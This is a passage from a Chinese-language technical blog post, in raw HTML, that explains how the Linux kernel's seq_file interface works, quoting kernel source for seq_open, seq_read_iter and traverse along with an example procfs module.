<span class="hljs-string">&quot;[a3kmod:] FAILED to create procfs interface!\n&quot;</span>);<br>        a3kmod_release_data_list();<br>        <span class="hljs-keyword">return</span> -EACCES;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Initialization done.\n&quot;</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br><br>    a3kmod_release_data_list();<br>    remove_proc_entry(<span class="hljs-string">&quot;a3kmod&quot;</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>简单测试：</p><p><img src="https://s2.loli.net/2024/06/03/liUg9bKBcz1QqGV.png"></p><h1 id="0x02-序列文件接口-实现原理"><a href="#0x02-序列文件接口-实现原理" class="headerlink" title="0x02. 序列文件接口 - 实现原理"></a>0x02. 序列文件接口 - 实现原理</h1><p>序列文件接口的实现其实可以理解成在 VFS 上套了一层通用 wrapper，整体上还是比较简单的，本节我们从 VFS 文件接口的调用路径来看序列文件接口是如何实现的</p><h2 id="seq-open-：-序列文件初始化"><a href="#seq-open-：-序列文件初始化" class="headerlink" title="seq_open() ： 序列文件初始化"></a>seq_open() ： 序列文件初始化</h2><p>使用序列文件接口需要在自定义的 <code>read()</code> 函数中调用 <code>seq_open()</code> 进行初始化，这个函数的作用其实就是分配一个 <code>seq_file</code> 结构体存放到 <code>file::private</code> 中，并去除文件属性 <code>file::f_mode</code> 中的 <code>FMODE_PWRITE</code> 位（即文件变得不可被使用 <code>pwrite()</code> 访问，因为这个函数不会改变文件偏移，对序列文件接口而言增加了操作复杂性）</p><p>不过比起简约的函数本身，注释则详细地对序列文件接口进行了说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_open -初始化序列文件</span><br><span class="hljs-comment"> *@file: 我们要初始化的文件</span><br><span class="hljs-comment"> *@op: 描述序列的方法表</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *seq_open() 设置了 @file, 将其与一个由 @op 描述的序列进行关联。</span><br><span class="hljs-comment"> *@op-&gt;start() 启动了迭代器并返回序列的第一个元素。</span><br><span class="hljs-comment"> *@op-&gt;stop() 将其停止。  </span><br><span class="hljs-comment"> *@op-&gt;next() 返回序列的下一个元素。</span><br><span class="hljs-comment"> *@op-&gt;show() 将元素打印到缓冲区中。</span><br><span class="hljs-comment"> *在出错的情况下 -&gt;start() 与 -&gt;next() 返回 ERR_PTR(error)，</span><br><span class="hljs-comment"> *  在序列到达末尾时返回 NULL。</span><br><span class="hljs-comment"> *-&gt;show() 在成功时返回 0,在出错时返回一个负数值，</span><br><span class="hljs-comment"> *  返回 SEQ_SKIP 表示 &quot;丢弃这个元素并继续移动&quot;。</span><br><span class="hljs-comment"> *注意: seq_open() 会分配一个 struct seq_file 并将其指针</span><br><span class="hljs-comment"> *存放在 @file-&gt;private_data，这个指针不应当被修改。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_open</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *op)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">p</span>;</span><br><br>WARN_ON(file-&gt;private_data);<br><br>p = kmem_cache_zalloc(seq_file_cache, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!p)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>file-&gt;private_data = p;<br><br>mutex_init(&amp;p-&gt;lock);<br>p-&gt;op = op;<br><br><span class="hljs-comment">// 没有引用计数: &#x27;p&#x27; 的生命周期被约束到文件的生命周期</span><br>p-&gt;file = file;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seq_files 支持 lseek() 与 pread()，且一点也不支持 write()，</span><br><span class="hljs-comment"> * 但我们因为一些历史原因在这清除 FMODE_PWRITE here 位。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 若一个 seq_files 的使用者：</span><br><span class="hljs-comment"> * a) 实现了 file.write() 且 b) 想要支持 pwrite()</span><br><span class="hljs-comment"> * 使用者需要在自己的 file.open() 中在调用 seq_open() 后再设置 FMODE_PWRITE。</span><br><span class="hljs-comment"> */</span><br>file-&gt;f_mode &amp;= ~FMODE_PWRITE;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_open);<br></code></pre></td></tr></table></figure><p>这个函数有一个更常用的 wrapper 叫 <code>__seq_open_private()</code> ，主要就是帮开发者多 kmalloc() 一个内存对象放到 <code>seq_file::private</code> 中，这里不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *__seq_open_private(<span class="hljs-keyword">struct</span> file *f, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> seq_operations *ops,<br><span class="hljs-type">int</span> psize)<br>&#123;<br><span class="hljs-type">int</span> rc;<br><span class="hljs-type">void</span> *private;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span>;</span><br><br>private = kzalloc(psize, GFP_KERNEL_ACCOUNT);<br><span class="hljs-keyword">if</span> (private == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">goto</span> out;<br><br>rc = seq_open(f, ops);<br><span class="hljs-keyword">if</span> (rc &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> out_free;<br><br>seq = f-&gt;private_data;<br>seq-&gt;private = private;<br><span class="hljs-keyword">return</span> private;<br><br>out_free:<br>kfree(private);<br>out:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br>EXPORT_SYMBOL(__seq_open_private);<br></code></pre></td></tr></table></figure><h2 id="（⭐核心）seq-read-：读取序列文件"><a href="#（⭐核心）seq-read-：读取序列文件" class="headerlink" title="（⭐核心）seq_read() ：读取序列文件"></a>（⭐核心）seq_read() ：读取序列文件</h2><p><code>seq_read()</code> 是正常 VFS 路径上 <code>read()</code> 会调用的函数，因为对于序列文件接口而言我们将函数表中的函数指针指定为该函数，不过这个函数主要是对 <code>seq_read_iter()</code> 的包装，在调用之前简单初始化了写入目标记录 <code>iovec</code> 与操作记录块 <code>kiocb</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_read -序列文件的 -&gt;read() 方法.</span><br><span class="hljs-comment"> *@file: 要读取的源文件</span><br><span class="hljs-comment"> *@buf: 要读入的目标缓冲区</span><br><span class="hljs-comment"> *@size: 最大读取字节</span><br><span class="hljs-comment"> *@ppos: 当前文件位置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;read()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> size, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iov</span> =</span> &#123; .iov_base = buf, .iov_len = size&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kiocb</span> <span class="hljs-title">kiocb</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br><span class="hljs-type">ssize_t</span> ret;<br><br>init_sync_kiocb(&amp;kiocb, file);<br>iov_iter_init(&amp;iter, ITER_DEST, &amp;iov, <span class="hljs-number">1</span>, size);<br><br>kiocb.ki_pos = *ppos;<br>ret = seq_read_iter(&amp;kiocb, &amp;iter);<br>*ppos = kiocb.ki_pos;<br><span class="hljs-keyword">return</span> ret;<br>&#125;<br>EXPORT_SYMBOL(seq_read);<br></code></pre></td></tr></table></figure><blockquote><p> 什么，你还不知道 iovec、 kiocb、iov_iter 是什么东西？简单来说就是在内核 IO 中用于存放操作信息的数据结构，前者是基础结构，后两者主要配对用于异步 IO：</p><ul><li>iovec：<code>io vector</code>，表示一块带长度的缓冲区</li><li>kiocb：<code>kernel i/o call back</code> ，记录文件侧 IO 信息，包括文件指针、当前偏移等</li><li>iov_iter ：<code>iovec iterator</code> ，用来操作 iovec 的迭代器，记录内存侧 IO 信息，包括内存地址、当前偏移等</li></ul></blockquote><p>下面我们来到序列文件读取的核心函数 <code>seq_read_iter()</code> ，首先会检查文件侧偏移，若是 0 则将序列文件的序列对象偏移与读取字节数也都设为 0：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Ready-made -&gt;f_op-&gt;read_iter()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">seq_read_iter</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *iocb, <span class="hljs-keyword">struct</span> iov_iter *iter)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> iocb-&gt;ki_filp-&gt;private_data;<br><span class="hljs-type">size_t</span> copied = <span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> n;<br><span class="hljs-type">void</span> *p;<br><span class="hljs-type">int</span> err = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!iov_iter_count(iter))<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>mutex_lock(&amp;m-&gt;lock);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * if request is to read from zero offset, reset iterator to first</span><br><span class="hljs-comment"> * record as it might have been already advanced by previous requests</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (iocb-&gt;ki_pos == <span class="hljs-number">0</span>) &#123;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>若是文件侧偏移与序列文件读取偏移不等则调用 <code>traverse()</code> 函数处理，如果出错直接跳到 <code>Done</code> 进行收尾，否则将序列文件偏移与文件偏移进行同步：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Don&#x27;t assume ki_pos is where we left it */</span><br><span class="hljs-keyword">if</span> (unlikely(iocb-&gt;ki_pos != m-&gt;read_pos)) &#123;<br><span class="hljs-keyword">while</span> ((err = traverse(m, iocb-&gt;ki_pos)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (err) &#123;<br><span class="hljs-comment">/* With prejudice... */</span><br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = iocb-&gt;ki_pos;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>traverse()</code> 函数有点类似一个小的 <code>seq_read_iter()</code> 的核心，作用其实是 <strong>将序列文件的偏移同步到指定的偏移值</strong> ，这里是<strong>同步到文件侧记录的偏移</strong> ：</p><ul><li>初始化从第一个序列数据对象开始读取，检查序列文件的临时缓冲区是否分配</li><li>调用 <code>op-&gt;start()</code> 初始化后进入读取循环：<ul><li>首先调用 <code>op-&gt;show()</code> 打印到临时缓冲区上</li><li>调用 <code>seq_has_overflowed()</code> 检查临时缓冲区是否读满，满则跳到 <code>Eoverflow</code> 标签重新分配一块更大的内存，需要注意的是 <code>traverse()</code> 的作用主要是进行正式读取前的偏移同步，因此不会保存前面读取的数据</li><li>调用 <code>op-&gt;next()</code> 移动到下个序列数据对象，若本次超出预期偏移则减去对应数据量大小并退出循环，注意这里额外用了一个变量 <code>pos</code> 记录读取的数据量，且每次完成读取会清空临时缓冲区读取计数 <code>m-&gt;count</code> 加到 <code>pos</code> 上</li><li>若完成读取到指定偏移的任务则退出循环</li></ul></li><li>调用 <code>op-&gt;stop()</code> 终止读取并返回</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">traverse</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> offset)</span><br>&#123;<br><span class="hljs-type">loff_t</span> pos = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> *p;<br><br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = m-&gt;from = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!offset)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (p) &#123;<br>error = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (IS_ERR(p))<br><span class="hljs-keyword">break</span>;<br>error = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(error)) &#123;<br>error = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (seq_has_overflowed(m))<br><span class="hljs-keyword">goto</span> Eoverflow;<br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos + m-&gt;count &gt; offset) &#123;<br>m-&gt;from = offset - pos;<br>m-&gt;count -= m-&gt;from;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pos += m-&gt;count;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (pos == offset)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br><span class="hljs-keyword">return</span> error;<br><br>Eoverflow:<br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> !m-&gt;buf ? -ENOMEM : -EAGAIN;<br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>seq_read_iter()</code> ，接下来首先检查 <code>buf</code> 是否分配，之后检查 <code>buf</code> 上是否有数据 <code>m-&gt;count != 0</code> ，若是则拷贝到 <code>iovec</code> 所指示的内存上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* grab buffer if we didn&#x27;t have one */</span><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>&#125;<br><span class="hljs-comment">// something left in the buffer - copy it out first</span><br><span class="hljs-keyword">if</span> (m-&gt;count) &#123;<br>n = copy_to_iter(m-&gt;buf + m-&gt;from, m-&gt;count, iter);<br>m-&gt;count -= n;<br>m-&gt;from += n;<br>copied += n;<br><span class="hljs-keyword">if</span> (m-&gt;count)<span class="hljs-comment">// hadn&#x27;t managed to copy everything</span><br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是预检查部分，作用是 <strong>进行一次读取，并检查缓冲区大小是否足够</strong> ：</p><ul><li>首先初始化序列文件临时缓冲区的起始偏移为 0，调用 <code>op-&gt;start()</code>  进行初始化，然后进入读取循环：<ul><li>首先调用 <code>op-&gt;show()</code> 打印当前序列数据对象到临时缓冲区，若跳过（如 <code>SEQ_SKIP</code> ）则当前轮的读取长度（ <code>m-&gt;count</code> ）记为 <code>0</code> ，并开始下轮循环</li><li>若临时缓冲区<strong>未满</strong> ，跳到 Fill 标签 <strong>开始正式的继续读取</strong> ，否则调用 <code>op-&gt;stop()</code> 停止并<strong>重新分配一个更大的缓冲区</strong>，之后重新读取当前序列数据对象</li></ul></li><li>若正常退出循环（break），说明读取失败，调用 <code>op-&gt;stop()</code> 停止并直接跳到 <code>Done</code> 标签进行收尾</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get a non-empty record in the buffer</span><br>m-&gt;from = <span class="hljs-number">0</span>;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>err = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// EOF or an error</span><br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">// hard error</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(err))<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (unlikely(!m-&gt;count)) &#123; <span class="hljs-comment">// empty record</span><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!seq_has_overflowed(m)) <span class="hljs-comment">// got it</span><br><span class="hljs-keyword">goto</span> Fill;<br><span class="hljs-comment">// need a bigger buffer</span><br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>&#125;<br><span class="hljs-comment">// EOF or an error</span><br>m-&gt;op-&gt;stop(m, p);<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br></code></pre></td></tr></table></figure><p>接下来就是核心的数据读取部分了：</p><ul><li>核心还是一个读取循环，不过前面预读取时已经 <code>start()</code> 过了所以这里直接开始读取：<ul><li>首先直接调用 <code>op-&gt;next()</code> 获取下一个序列数据对象（因为前面已经读过一次了），若开发者定义的该函数没有更新 <code>m-&gt;index</code> 则会手动自增，获取出错则跳出循环</li><li>若缓冲区上已有数据量大于 iovec 迭代器剩余量（<code>iov_iter_count(iter)</code>）则跳出循环</li><li>调用 <code>op-&gt;show()</code> 将新获取到的序列数据对象打印到缓冲区上，若溢出则跳出循环，注意这里的 <code>offs</code> 记录的是当前次循环开始前的 <code>m-&gt;count</code></li></ul></li><li>接下来调用 <code>op-&gt;stop()</code> 停止，并调用 <code>copy_to_iter()</code> 将临时缓冲区上数据拷贝到 iovec 迭代器所指示的 iovec 所指示的内存上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">Fill:<br><span class="hljs-comment">// one non-empty record is in the buffer; if they want more,</span><br><span class="hljs-comment">// try to fit more in, but in any case we need to advance</span><br><span class="hljs-comment">// the iterator once for every record shown.</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-type">size_t</span> offs = m-&gt;count;<br><span class="hljs-type">loff_t</span> pos = m-&gt;index;<br><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos == m-&gt;index) &#123;<br>pr_info_ratelimited(<span class="hljs-string">&quot;buggy .next function %ps did not update position index\n&quot;</span>,<br>    m-&gt;op-&gt;next);<br>m-&gt;index++;<br>&#125;<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// no next record for us</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (m-&gt;count &gt;= iov_iter_count(iter))<br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = offs;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err || seq_has_overflowed(m)) &#123;<br>m-&gt;count = offs;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br>n = copy_to_iter(m-&gt;buf, m-&gt;count, iter);<br>copied += n;<br>m-&gt;count -= n;<br>m-&gt;from = n;<br></code></pre></td></tr></table></figure><p>最后就是一些常规的收尾工作，例如在序列文件与 kiocb 中记录拷贝的字节数等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">Done:<br><span class="hljs-keyword">if</span> (unlikely(!copied)) &#123;<br>copied = m-&gt;count ? -EFAULT : err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>iocb-&gt;ki_pos += copied;<br>m-&gt;read_pos += copied;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> copied;<br>Enomem:<br>err = -ENOMEM;<br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br>EXPORT_SYMBOL(seq_read_iter);<br></code></pre></td></tr></table></figure><p>不难看出序列文件接口的读取实现其实非常的简洁</p><h2 id="seq-lseek-：序列文件偏移操作"><a href="#seq-lseek-：序列文件偏移操作" class="headerlink" title="seq_lseek()：序列文件偏移操作"></a>seq_lseek()：序列文件偏移操作</h2><p>这个函数比较简洁，主要就是移动当前的序列文件偏移，对于相对偏移值（<code>SEEK_CUR</code> 路径）会先转换成绝对偏移值，进行偏移值计算的路径归一化，偏移值移动则主要靠 <code>traverse()</code> 完成，前文已经讲过故这里不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 